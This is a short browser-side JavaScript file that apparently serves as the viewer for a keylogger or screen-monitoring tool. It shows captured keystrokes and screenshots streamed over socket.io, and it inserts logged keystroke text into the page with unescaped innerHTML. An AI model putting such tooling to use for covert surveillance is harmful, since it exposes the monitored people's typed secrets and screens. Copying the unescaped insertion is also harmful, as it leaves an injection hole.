const socket = io();

socket.on('connect', function() {
    console.log('Connected to server');
});

socket.on('new_keystroke', function(data) {
    const logDiv = document.getElementById('log');
    logDiv.innerHTML += `<p>${data.data}</p>`;
    logDiv.scrollTop = logDiv.scrollHeight;
});

socket.on('new_screenshot', function(data) {
    addScreenshot(data.filename);
});

document.getElementById('fetch-screenshots').addEventListener('click', function() {
    fetch('/get_screenshots')
        .then(response => response.json())
        .then(data => {
            const screenshotsDiv = document.getElementById('screenshots');
            screenshotsDiv.innerHTML = '';  // Clear current screenshots
            data.forEach(filename => {
                addScreenshot(filename);
            });
        });
});

function addScreenshot(filename) {
    const screenshotsDiv = document.getElementById('screenshots');
    const img = document.createElement('img');
    img.src = `/screenshots/${filename}`;
    img.alt = filename;
    img.style.maxWidth = '200px';
    img.style.margin = '10px';
    screenshotsDiv.appendChild(img);
}